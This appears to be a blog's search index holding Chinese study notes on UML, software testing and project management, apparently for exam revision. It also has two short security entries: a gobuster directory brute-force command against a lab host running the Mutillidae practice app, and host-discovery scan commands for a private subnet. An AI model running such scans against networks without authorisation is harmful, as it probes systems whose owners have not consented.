<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>UML考试范围</title>
    <url>/posts/40fd60c1/</url>
    <content><![CDATA[<h1 id="UML复习"><a href="#UML复习" class="headerlink" title="UML复习"></a>UML复习</h1><h2 id="业务建模"><a href="#业务建模" class="headerlink" title="业务建模"></a>业务建模</h2><p>业务用户表示为业务参与者(Business Actor)<br>业务过程表示为业务用例(Business Use-Case)和业务用例实现<br>人们在组织中扮演的角色表示为业务工人(Business Worker)<br>组织管理或制造的“东西”表示为业务实体(Business Entity)</p><h3 id="业务建模图语法"><a href="#业务建模图语法" class="headerlink" title="业务建模图语法"></a>业务建模图语法</h3><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>业务工人: 人+圆圈+斜线<br>系统：圆圈加斜线<br>业务参与者: 人+斜线<br>业务用例: 椭圆+斜线</p><h3 id="业务建模流程"><a href="#业务建模流程" class="headerlink" title="业务建模流程"></a>业务建模流程</h3><ul><li>愿景</li><li>建立业务用例模型<ul><li>识别业务参与者</li><li>识别业务用例</li><li>详述业务用例</li></ul></li><li>建立业务对象模型</li></ul><p>愿景定义: 在目标组织代表看来，引进该系统应该给组织带来的改进</p><p>目标组织和老大:<br>目标组织:待引入系统将改进其流程的组织<br>老大：目标组织的代表，就是谁需要这个东西<br>愿景表达了“为什么要开发这个系统</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191225162316.png" alt></p><p>业务参与者: 在业务之外，与业务进行交互的人或组织<br>业务工人:组织内的人称为业务工人<br>业务实体： 业务实体是指组织内的非人智能系统<br>业务工人和业务实体不出现在用例图中<br>业务用例: 业务为业务参与者提供的价值<br>体现企业业务本质，是有意义的目标</p><p>用例局限于方面<br>比如</p><ol><li>患者到医院是看病</li><li>患者到挂号室是挂号</li></ol><p>不能把交互片断当成用例<br>系统用例所需时间较短<br>业务工人行为不能当做业务用例<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191225172331.png" alt><br>这个有什么问题</p><p>描述业务用例<br>三种可选方式：文字，活动图，顺序图<br>业务用例文档中插入活动图<br>活动图中插入文字+注释+基本路径<br>顺序图(需要涉及业务对象模型)</p><h2 id="系统建模"><a href="#系统建模" class="headerlink" title="系统建模"></a>系统建模</h2><p>用例是用户观点而非系统观点</p><p>参与者：在系统之外，透过系统边界与系统进行有意义交互的任何事物<br>用例实例是系统执行的一系列动作，这些动作将生成特定参与者可观测的结果值</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>UML， 复习</tag>
      </tags>
  </entry>
  <entry>
    <title>UML考试范围</title>
    <url>/posts/40fd60c1/</url>
    <content><![CDATA[<h1 id="UML"><a href="#UML" class="headerlink" title="UML"></a>UML</h1><h2 id="画图"><a href="#画图" class="headerlink" title="画图"></a>画图</h2><p>用例，顺序，类图</p><h2 id="简答"><a href="#简答" class="headerlink" title="简答"></a>简答</h2><p>什么叫用例<br>什么叫参与者<br>用例怎么表示</p><h2 id="改错-20分-ppt"><a href="#改错-20分-ppt" class="headerlink" title="改错(20分) ppt"></a>改错(20分) ppt</h2><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <tags>
        <tag>UML， 考试</tag>
      </tags>
  </entry>
  <entry>
    <title>基础/C#命名空间</title>
    <url>/posts/e5cd08f2/</url>
    <content><![CDATA[<h1 id="C-命名空间"><a href="#C-命名空间" class="headerlink" title="C#命名空间"></a>C#命名空间</h1><p>解决方案里包含多个项目名，项目名不是最主要的，实质是命名空间，像用到反射机制的话，在配置文件里写的应该是命名空间而不是项目名，可以更改项目名，但是命名空间没修改的话，写项目名直接会出现空引用</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
  </entry>
  <entry>
    <title>软件测试复习</title>
    <url>/posts/c26930a8/</url>
    <content><![CDATA[<h1 id="软测复习"><a href="#软测复习" class="headerlink" title="软测复习"></a>软测复习</h1><h2 id="软件质量和质量保证"><a href="#软件质量和质量保证" class="headerlink" title="软件质量和质量保证"></a>软件质量和质量保证</h2><h3 id="软件质量"><a href="#软件质量" class="headerlink" title="软件质量"></a>软件质量</h3><p>由三部分构成：<br>软件产品的质量，即满足使用要求的程度。<br>软件开发过程的质量，即能否满足开发所带来的成本、<br>时间和风险等要求。<br>软件在其商业环境中所表现的质量。</p><h3 id="质量保证"><a href="#质量保证" class="headerlink" title="质量保证"></a>质量保证</h3><p>软件的质量保证就是向用户及社会提供满意的高质量的产品，进一步地说，软件的质量保证活动也和一般的质量保证活动一样，是确保软件产品从诞生到消亡为止的所有阶段的质量的活动。即为了确定、达到和维护需要的软件质量而进行的所有有计划、有系统的管理活动。</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h3 id="软件测试"><a href="#软件测试" class="headerlink" title="软件测试"></a>软件测试</h3><p>从标准论来看软件测试，可以定义为软件测试就是“验证（Verification）”和“有效性确认(Validation）”活动构成的整体，即软件测试 = V&amp;V。<br>“验证”是检验软件是否已正确地实现了产品规格书所定义的系统功能和特性。<br>“有效性确认”是确认所开发的软件是否满足用户真正需求的活动。</p><p>测试，常常被认为是质量控制的最主要手段。</p><h2 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h2><p>语句覆盖:每个语句至少执行一次。<br>判定覆盖:每个语句至少执行一次，并且判定结果也要执行一次，就是使判定结果为0或1都要一次<br>条件覆盖:每个语句至少执行一次，并且判定条件可能结果都得至少执行一次，比如说a&gt;0 and b&gt;0，就是得让a&gt;0执行一次，a&lt;0也要执行一次，b&gt;0执行一次，b&lt;0也要执行一次</p><p>A&gt;0,A&lt;=0 B&gt;0,B&lt;=0<br>A&gt;1,A&lt;=1 C&gt;1,C&lt;=1</p><p>A&gt;1 B&gt;0 C&gt;1<br>2 1 2<br>0 0 0</p><p>判定/条件覆盖 每个条件都取到可能结果，每个判定表达式也都取到可能结果<br>条件组合覆盖 每种条件都要达到</p><p>(1)(5) 2 1 2<br>(3)(7) 0 1 2<br>(2)(6) 2 -1 0<br>(4)(8) -1 -1 -1</p><p>修正的判定/条件覆盖 在满足判定/条件覆盖的基础上，每个简单判定条件都应该独立地影到整个判定表达式的取值</p><p>大题：</p><ol><li>流程图</li><li>环路复杂度</li><li>基本路径</li><li>设计用例</li><li>预期结果</li></ol><p>路径覆盖</p><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><h3 id="边界值测试"><a href="#边界值测试" class="headerlink" title="边界值测试"></a>边界值测试</h3><ul><li>穷举法</li><li>典型值法</li></ul><p>先确定边界值，在选取典型值，a-1,a,a+1<br>遵循单一变量原则，年份变，月份不变，日不变</p><h3 id="等价类"><a href="#等价类" class="headerlink" title="等价类"></a>等价类</h3><ol><li>输入输出确定</li><li>划分等价类</li><li>设计测试用例<ul><li>有效等价类尽可能覆盖</li><li>无效等价类每个用例包含一个</li></ul></li><li>选取测试用例<ul><li>输出</li><li>预期输出</li></ul></li></ol><h3 id="决策表"><a href="#决策表" class="headerlink" title="决策表"></a>决策表</h3><p>建立等价类</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在以下等价类集合上建立决策表：</span><br><span class="line">M1：&#123;month：month有30天&#125;</span><br><span class="line">M2：&#123;month：month有31天，12月除外&#125;</span><br><span class="line">M3：&#123;month：month是12月&#125;</span><br><span class="line">M4：&#123;month：month是2月&#125;</span><br><span class="line">D1：&#123;day：1 ≤day ≤27&#125; </span><br><span class="line">D2：&#123;day：day=28&#125;</span><br><span class="line">D3：&#123;day：day=29&#125;</span><br><span class="line">D4：&#123;day：day=30&#125;</span><br><span class="line">D5：&#123;day：day=31&#125;</span><br><span class="line">Y1：&#123;year：year是闰年&#125;</span><br><span class="line">Y2：&#123;year：year不是闰年&#125;</span><br></pre></td></tr></table></figure><p>建立条件桩<br>C1: 月份在{M1,M2,M3,M4}<br>C2:日期<br>C3: 年</p><p>建立动作桩<br>A1:不可能<br>A2:日期增1<br>A3: …</p><p>建立决策表</p><p>条件<br>动作<br>测试用例，预期输出</p><h3 id="因果图"><a href="#因果图" class="headerlink" title="因果图"></a>因果图</h3><p>因: 输入条件<br>果: 输出结果或者程序状态的改变</p><ol><li>恒等关系</li><li>非关系</li><li>或</li><li>与</li></ol><p>记住图解</p><p>约束关系说明:<br>E约束，最多只有一个为1<br>I约束(或): 至少一个为1<br>O约束(唯一) a和b必须有一个且只有一个为1<br>R约束： a是1，b也必须是1，a推到出b<br>M约束: 结果a为1，结果b必须为0</p><p>判定表</p><h3 id="基于场景的测试"><a href="#基于场景的测试" class="headerlink" title="基于场景的测试"></a>基于场景的测试</h3><ol><li><p>基本流<br>备选流</p></li><li><p>场景构建:<br>场景1(取款成功):基本流;<br>场景2:():基本+备选</p></li><li><p>测试用例设计</p><ul><li>I无效数据</li><li>V有效数据</li><li>N/A不用输入</li></ul></li><li><p>测试数据设计</p></li></ol><h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>五个阶段: 测试计划，脚本创建，场景定义，场景运行，结果分析</p><p>响应时间原则：<br>2 很好<br>5 差一点<br>10 最大<br>8小时，404</p><p>性能测试结果能干嘛？</p><ul><li>分析系统瓶颈，优化系统</li><li>在真实环境下检测系统性能，评估系统性能以及服务等级的满足情况</li><li>御剑系统负载压力承受力，在应用实际部署之前，评估系统性能</li></ul><p>性能指标:</p><ul><li>并发用户数</li><li>资源利用率</li><li>响应时间</li></ul><h2 id="bug流程管理"><a href="#bug流程管理" class="headerlink" title="bug流程管理"></a>bug流程管理</h2><ol><li>回归测试应测全部案例</li><li>BUG流程管理，发现的话，应提交项目经理确认是否可以取消，不能取消的，仍然需要开发组进行修改并进行回归测试。</li></ol><ol><li>测试介入太晚</li><li>回归测试不合理，所有缺陷应经过验证修改后才可以发布</li><li>产品发布出口不对</li><li>缺陷流程管理不合理<ul><li>缺陷的权限控制不严</li><li>没有对每个缺陷进行全程跟踪</li><li>缺少缺陷审核步骤</li></ul></li></ol><h2 id="单元测试，集成测试，系统测试，验收测试"><a href="#单元测试，集成测试，系统测试，验收测试" class="headerlink" title="单元测试，集成测试，系统测试，验收测试"></a>单元测试，集成测试，系统测试，验收测试</h2><p>单元测试 测函数功能，测的模块接口，局部数据，边界<br>集成测试 将一两个子功能集合起来测试，包括模块测试跟子功能测试，测得模块间接口<br>系统测试 测试整个系统，包括功能测试，性能测试等<br>验收测试 测试人员与开发人员最后沟通测试</p><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p>测试人员一般不参与单元测试</p><p>单元测试又称模块测试，是针对软件设计的最小单位 ─ 程序模块，进行正确性检验的测试工作。</p><h3 id="集成测试"><a href="#集成测试" class="headerlink" title="集成测试"></a>集成测试</h3><p>集成测试又称组装测试、联合测试、子系统测试或部件测试</p><h4 id="自顶向下"><a href="#自顶向下" class="headerlink" title="自顶向下"></a>自顶向下</h4><p>这种测试方法不需要驱动模块<br>首先单独测试每一层。对于顶层而言，需要构造桩</p><h4 id="自底向上"><a href="#自底向上" class="headerlink" title="自底向上"></a>自底向上</h4><p>写一个驱动程序</p><h3 id="系统测试"><a href="#系统测试" class="headerlink" title="系统测试"></a>系统测试</h3><p>系统测试对象为整个产品系统，它不仅包括产品系统的软件，还要包含系统软件所依赖的硬件、外设甚至包括接口。</p><p>用户层测试<br>应用层测试<br>功能层测试<br>指标/协议层测试</p><h2 id="整体过程"><a href="#整体过程" class="headerlink" title="整体过程"></a>整体过程</h2><p>需求分析审查-&gt;设计审查-&gt;单元测试-&gt;集成测试-&gt;功能验证-&gt;系统测试-&gt;验收测试-&gt;版本发布-&gt;维护</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>软测， 复习</tag>
      </tags>
  </entry>
  <entry>
    <title>软件测试考试</title>
    <url>/posts/e9585511/</url>
    <content><![CDATA[<h1 id="软测考试"><a href="#软测考试" class="headerlink" title="软测考试"></a>软测考试</h1><p>40分</p><ol><li>10选择</li><li>10判断</li></ol><ul><li>等价类，边界值</li><li>黑盒</li></ul><p>性能分析<br>基于场景 分析备选流</p><h2 id="软件质量"><a href="#软件质量" class="headerlink" title="软件质量"></a>软件质量</h2><p>软件质量由哪三部分构成？红字<br>质量如何保证？</p><h2 id="软件测试"><a href="#软件测试" class="headerlink" title="软件测试"></a>软件测试</h2><ol><li><p>软件测试的目标</p></li><li><p>软件测试方法(50分包含选择和大题)</p><ul><li>黑盒测试<ul><li>黑盒测试概念</li><li>黑盒测试方法</li></ul></li><li>白盒测试<ul><li>白盒测试概念</li><li>白盒测试方法</li></ul></li></ul></li><li><p>软件测试流程(不考大题,需要知道概念)</p><ul><li>单元测试<ul><li>概念</li><li>重点</li></ul></li><li>集成测试<ul><li>概念</li><li>重点</li></ul></li><li>系统测试<ul><li>概念</li><li>重点</li></ul></li><li>验收测试</li></ul></li><li><p>软件测试的过程管理(bug管理,流程管理等)</p><ul><li>测试阶段(纵向)</li><li>测试流程(横向)</li></ul></li><li><p>软件测试的团队组织</p></li></ol><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="大题"><a href="#大题" class="headerlink" title="大题"></a>大题</h2><ul><li>黑盒白盒</li><li>用例设计题</li><li>分析题<ul><li>性能分析</li><li>bug流程</li></ul></li></ul><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>软测， 考试</tag>
      </tags>
  </entry>
  <entry>
    <title>gobuster使用</title>
    <url>/posts/48e7f5e0/</url>
    <content><![CDATA[<h1 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h1><p>例子</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u <span class="string">"http://10.1.1.20/mutillidae/"</span> -w /usr/share/wordlists/dirb/small.txt</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <tags>
        <tag>gobuster</tag>
      </tags>
  </entry>
  <entry>
    <title>主机发现</title>
    <url>/posts/a411b31e/</url>
    <content><![CDATA[<h1 id="主机发现工具"><a href="#主机发现工具" class="headerlink" title="主机发现工具"></a>主机发现工具</h1><h2 id="netenum"><a href="#netenum" class="headerlink" title="netenum"></a>netenum</h2><p>主机枚举</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netenum 网段 5 1</span><br><span class="line">netenum 192.168.0.1/24 5 1</span><br></pre></td></tr></table></figure><h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.0.1/24</span><br></pre></td></tr></table></figure><h2 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nbtscan 192.168.0.1/24</span><br></pre></td></tr></table></figure><h2 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h2><p>通过ping 查看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fping -asg 192.168.0.1/24</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>主机发现</tag>
      </tags>
  </entry>
  <entry>
    <title>软件项目管理</title>
    <url>/posts/cf1f2408/</url>
    <content><![CDATA[<h1 id="软件项目管理"><a href="#软件项目管理" class="headerlink" title="软件项目管理"></a>软件项目管理</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p>一、填空题<br>1.敏捷模型包括（4）个核心价值，对应（12）个敏捷原则。<br>2.项目管理包括（启动过程组）、（计划过程组）、（执行过程组）、（控制过程组）、（收尾过程组）5个过程组。</p><p>二、判断题<br>1、搬家属于项目。（√）<br>2、项目是为了创造一个唯一的产品或提供一个唯一的服务而进行的永久性的努力。（×）<br>3、过程管理就是对过程进行管理，目的是要让过程能够被共享、复用，并得到持续的改进。（√）<br>4、项目具有临时性的特征。（√）<br>5、日常运作存在大量的变更管理，而项目基本保持连贯性的。（×）<br>6、项目开发过程中可以无限制地使用资源。（×）<br>7、相比传统开发的预测性过程，敏捷开发属于自适应过程（√）</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>三、选择题<br>1、下列选项中不是项目与日常运作的区别的是（C）<br>A. 项目是以目标为导向的，日常运作是通过效率和有效性体现的。<br>B. 项目是通过项目经理及其团队工作完成的，而日常运作是职能式的线性管理。<br>C．项目需要有专业知识的人来完成，而日常运作的完成无需特定专业知识。<br>D．项目是一次性的，日常运作是重复性的。</p><p>2、以下都是日常运作和项目的共同之处，除了（D）<br>A．由人来做<br>B．受限于有限的资源<br>C．需要规划、执行和控制<br>D．都是重复性工作</p><p>3、下面选项中不是PMBOK的知识域的是（A）<br>A.招聘管理 B.质量管理 C.范围管理 D.风险管理</p><p>4、下列选项中属于项目的是（C）<br>A．上课 B.社区保安 C.野餐活动 D.每天的卫生保洁</p><p>5、下列选项中正确的是（C）<br>A．一个项目具有明确的目标而且周期不限<br>B.一个项目一旦确定就不会发生变更<br>C．每个项目都有自己的独特性<br>D．项目都是一次性的并由项目经理独自完成</p><p>6、（B）是为了创造一个唯一的产品或提供一个唯一的服务而进行的临时性的努力。</p><p>A．过程 B.项目 C.项目群 D.组合</p><p>7、下面选项中不是《敏捷宣言》中的内容的是（C）<br>A.个体和交互胜过过程和工具<br>B.可以工作的软件胜过面面俱到的文档<br>C. 敏捷开发过程是自适应的过程<br>D.响应变化胜过遵循计划</p><p>8、下列活动中不是项目的是（C）<br>A．野餐活动 B.集体婚礼 C.上课 D.开发操作系统</p><p>9、下列选项中不是项目的特征的是（C）<br>A.项目具有明确的目标<br>B.项目具有限定的周期<br>C.项目可以重复进行<br>D.项目对资源成本具有约束性</p><p>四、问答题</p><p>1、项目管理知识体系（PMBOK）包括哪10个知识领域？</p><p>答：项目集成管理、项目范围管理、项目时间管理、项目成本管理、项目质量管理、项目人力资源管理、项目沟通管理、项目风险管理、项目采购管理、项目干系人管理</p><p>2、请简述项目管理的5个过程组及其关系。（可简答）</p><p>答：（1）启动过程组：主要是确定一个项目或一个阶段可以开始了，并要求着手实行；定义和授权项目或者项目的某个阶段。<br>（2）计划过程组：为完成项目所要达到的商业要求而进行的实际可行的工作计划的设计、维护，确保实现项目的既定商业目标。计划基准是后面跟踪和监控的基础。<br>（3）执行过程组：根据前面制定的基准计划，协调人力和其他资源，去执行项目管理计划或相关子计划。<br>（4）控制过程组：通过监控和检测过程确保项目达到目标，必要时采取一些修正措施。集成变更控制是一个重要的过程。<br>（5）收尾过程组：取得项目或阶段的正式认可并且有序地结束该项目或阶段。向客户提交相关产品，发布相关结束报告，并且更新组织过程资产并释放资源。</p><p>关系：各个过程组通过其结果进行连接，一个过程组的结果或输出是另一个过程组的输入。其中，计划过程组、执行过程组、控制过程组是核心管理过程组。</p><p>3、项目的特征是什么。</p><p>答：目标性、相关性、临时性、独特性、资源约束性、不确定性</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><p>一、填空题<br>1、项目立项之后，项目负责人会进行（自造-购买）决策，确定待开发产品的哪些部分应该采购、外包开发、自主研发等。<br>2、PMI人才三角重点关注（技术项目管理）、（领导力）、（战略和商务管理）3个关键技能。<br>3、在（立项）阶段，应该明确项目的目标、时间表、使用的资源和经费，而且得到项目发起人的认可。</p><p>二、判断题</p><p>1、项目立项可以确立项目目标、时间和资源成本，同时得到项目发起人的认可。（√）<br>2、项目招标对于一个项目的开发是必需的，即便项目是内部项目。（×）<br>3、make or buy决策中的make指的只是自主开发。（√）<br>4、项目建议书是项目计划阶段开发的文档。（×）<br>5、项目立项需要获得项目经理的认可，但不需要项目发起人的认可。（×）<br>6、项目章程是项目执行组织高层批准的确认项目存在的文件，其中不包括对项目经理的授权。（×）<br>7、乙方即供方（有时也称卖方）是为顾客提供产品或服务的一方。（√）<br>8、在软件项目合同中，甲方是需求方，乙方是供方。（√）<br>9、敏捷项目采取的是仆人式管理方式（√）</p><p>三、选择题</p><p>1、下列不是项目立项过程内容的是（B）<br>A.项目的目标<br>B.项目的风险<br>C.项目的时间表<br>D.项目使用的资源和经费</p><p>2、以下哪项不包括在项目章程中？（C）<br>A.对项目的确认 B.对项目经理的授权 C.对项目风险的分析 D.项目目标的描述</p><p>3、项目建议书是（C）阶段开发的文档<br>A.项目执行 B.项目结尾 C.项目初始 D.项目计划</p><p>4、下列不属于甲方招投标阶段任务的是？（A）<br>A.编写建议书 B.招标书定义 C.供方选择 D.合同签署</p><p>5、下列不属于乙方招投标阶段任务的是？（D）<br>A.项目分析 B.竞标 C.合同签署 D.招标书定义</p><p>6、PMI人才三角不包括（B）<br>A、技术项目管理<br>B、测试能力<br>C、领导力<br>D、战略和商务管理</p><p>四、问答题</p><p>1、某公司希望开发一套软件产品，如果选择自己开发软件的策略，公司需要花费30000元，根据历史信息，维护这个软件每个月需要3500元。如果选择购买软件公司产品的策略，需要18000元，同时软件公司为每个安装的软件进行维护的费用是4200元/月。该公司该如何决策？</p><p>答：自制方案：<br>制造费 30000元维护费 3500元/月<br>购买方案：<br>购买费 18000元维护费 4200元/月<br>制造差额：30000-18000=12000元<br>服务差额：4200-3500=700元<br>自制方案承受月份：12000/700=17.14<br>如果产品在17个月以内可以选择购买方案，如果超过17个月选择自造方案。</p><p>2、什么是项目章程？</p><p>答：项目章程是项目执行组织高层批准的一份以书面签署的确认项目存在的文件，包括对项目的确认、对项目经理的授权和项目目标的概述等。</p><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><p>一、填空题</p><p>1.（瀑布模型）生存期模型中，要求项目所有的活动都严格按照顺序进行，一个阶段的输入时下一个阶段的输入。<br>2.总体上，项目生存期模型可以是预测型或（适应型）<br>3.DevOps是（Development）和（Operations）的组合</p><p>二、判断题<br>1、瀑布模型不适合短期项目。（×）<br>2、增量式模型可以避免一次性投资太多带来的风险。（√）<br>3、V模型适合的项目类型是需求很明确、解决方案很明确，而且对系统的性能要求比较严格的项目。（√）<br>4、瀑布模型和V模型都属于预测型生存期模型（√）<br>5、在瀑布生存期模型中，要求项目所有的活动都严格按照顺序执行，一个阶段的输出是下一个阶段的输入。（√）<br>6、极限编程从3个层面提供了13个敏捷实践（√）<br>7、敏捷包括《敏捷宣言》的价值观、12个原则，以及一些通用实践等（√）</p><p>三、选择题<br>1、对于某项目，甲方提供了详细、准确的需求文档。我们的解决方案也很明确。且安全性要求非常严格。此项目采用（C）成存期模型比较合适。<br>A：瀑布模型 B：增量式模型 C：V模型 D：XP模型</p><p>2、下面属于预测型生存期模型的是（A）<br>A、瀑布模型 B、增量型生存期模型 C、Scrum模型 D、原型模型</p><p>3、下面关于敏捷模型描述不正确是（D）<br>A、与传统模型相比，敏捷模型属于自适应过程<br>B、可以应对需求的不断变化<br>C、Scrum模型、XP模型、DevOps模型等都属于敏捷模型<br>D、敏捷型是预测型和迭代型的混合模型</p><p>4、XP模型的实践原则不包括以下哪一点？（D）<br>A：快速反馈 B：假设简单 C：包容变化 D：详细设计</p><p>5、在项目初期，一个项目需求不明确的情况下，应避免采用以下哪种生存期模型？（C）<br>A：快速原型模型 B：增量式模型 C：V模型 D：Scrum模型</p><p>6、关于迭代模型，下列说法不正确的是（D）<br>A、不断反馈原型 B、可以加快开发速度 C、项目需求变化大 D、不多次提交</p><p>四、问答题</p><p>1、写出三种你熟悉的生存期模型，并说明这些模型适用于什么情况下的项目。</p><p>（1）瀑布模型<br>适用于软件需求很明确的软件项目，即一般适用于功能明确、完成、无重大变化的软件系统的开发，即：<br>1） 在项目开始前，项目的需求已经被很好的理解、也很明确，而且项目经理很熟悉为实现这一模型所需要的过程。<br>2） 解决方案在项目开始前也很明确。<br>3） 短期项目可采用瀑布模型。</p><p>（2）V模型<br>适用于项目需求在项目开始前很明确、解决方案在项目开始前也很明确，项目对系统的安全很严格，如航天飞机控制系统、公司的财务系统等。</p><p>(3)快速原型模型<br>适用于项目的需求在项目开始前不明确，需要减少项目的不确定性的时候。</p><p>2、混合模型是什么模型？<br>把几种不同模型组合成一种混合模型，它允许一个项目能沿着最有效的路径发展，这就是过程开发模型（或混合模型）</p><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><p>一、填空题<br>1.需求管理包括（需求获取）、（需求分析）、（需求规格编写）、（需求验证）、（需求变更） 5个过程。<br>2.敏捷项目主要采用（用户故事）描述需求</p><p>二、判断题<br>1.需求规格说明可以包括系统的运行环境。（√）<br>2.数据流分析方法是一种自下而上逐步求精的分析方法。（×）<br>3.需求分析工作完成的一个基本标志是形成了一份完整的、规范的需求规格说明书。（×）<br>4.需求是指用户对软件的功能和性能的要求，就是用户希望软件能做什么事，完成什么样的功能，达到什么性能。（√）<br>5.用户故事常常写在卡片上，然后将其部署在墙上（√）<br>6.软件项目系统的响应时间属于功能性需求（×）<br>7.数据字典是由数据项、数据流及操作指令组成的（×）</p><p>三、选择题</p><p>1、下列不属于软件项目管理需求过程的是？（D）<br>A：需求获取 B：需求分析 C：需求规格编写 D：需求更新</p><p>2、下列不属于数据字典组成部分的是？（D）<br>A：数据项 B：数据流 C：数据文件 D：数据库</p><p>3、下列不属于UML需求视图的是？（A）<br>A：甘特图 B：用例图 C：状态图 D：顺序图</p><p>4、下列关于用户故事描述不正确的是（D）<br>A．英文称：user story<br>B．不使用技术语言来描述<br>C．可以描述敏捷需求<br>D．一种数据结构</p><p>5、（A）是软件项目的的一个突出特点，可以导致软件项目的蔓延。<br>A：需求变更 B：暂时性 C：阶段性 C：约束性</p><p>6、下列不属于结构化方法设计的是？（D）<br>A：数据流图 B：数据字典 C：系统流程图 D：系统用例图</p><p>7、下列不属于软件需求范畴的是？（A）<br>A：软件项目采用什么样的实现技术<br>B：用户需要软件能做什么样的事情<br>C：用户需要软件完成什么样的功能<br>D：用户需要软件达到什么样的性能</p><p>8、敏捷项目需求一般采用下面（C）描述<br>A、用户用例 B、DFD C、用户故事 D、数据字典</p><p>四、问答题</p><p>1.下图是SPM项目需求规格文档中的一个用例图，请根据图中信息判断参与者是什么角色？并写出至少三个用例，如登录、注册等。</p><p>1)参与者是课务管理系统中的学生用户<br>2）登录、注册、选课</p><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><p>一、填空题<br>1.任务分解是将一个项目分解为更多的工作细目或者（子项目），是项目变得更小、更易管理、更易操作。</p><p>3.WBS的全称是（任务分解结构Work Breakdown Structure）。</p><p>3.WBS最底层次可交付成果是（工作包work package）。</p><p>二．判断题<br>1.WBS提供了项目范围基线。（√）<br>2.一个工作包可以分配给另一个项目经理去完成。（√）<br>3.如果开发人员对项目比较熟悉或者对项目大局有把握，开发WBS时最好采用自底向上方法。（×）<br>4.对于一个没有做过的项目，开发WBS时可以采用自底向上方法。（√）<br>5.在任务分解结果中，最底层的要素必须是实现项目目标的充分必要条件。（√）<br>6.一个工作包应当由唯一主题负责。（√）<br>7.WBS的最高层次的可交付成果是工作包。（×）<br>8.对任务的分解只能是自上而下的。（×）<br>9.WBS的最底层任务是能分配到一个人完成的任务。（√）<br>10.敏捷项目的一个Epic还可以继续分解为一些用户故事（√）</p><p>三.选择题。<br>1.WBS非常重要，因为下列原因，除了（D）<br>A.帮助组织工作B.防止遗漏工作C.为项目估算提供依据D.确定团队成员责任</p><p>2.WBS中的每一个具体细目通常都指定唯一的（A）<br>A.编码B.地点C.功能模块D.提交截至期限</p><p>3.下列不是创建WBS的方法的是（C）<br>A.自顶向下B.自底向上C.控制方法D.模板参照</p><p>4.任务分解时，（D）方法从特殊到一般的方向进行，首先定义一些特殊的任务，然后将这些任务组织起来，形成更高级别的WBS层。<br>A.模板参照B.自顶向下C.类比D.自底向上</p><p>5.下列关于WBS的说法，不正确的是（D）<br>A.WBS是任务分解的结果<br>B.不包括再WBS中的任务就不是该项目的工作<br>C.可以采用清单或者图表的形式标石WBS的结果<br>D.如果项目是一个崭新的项目，最好采用自顶向下方法开发WBS</p><p>6.检验WBS分解结果的标准不包括以下那一项？(B)<br>A.最底层的要素是否是实现目标的充分必要条件<br>B.分解的层次不少于3层<br>C.最底层元素是否有重复<br>D.最底层要素是否有清晰完整定义</p><p>7.WBS是对项目由粗到细的分解过程，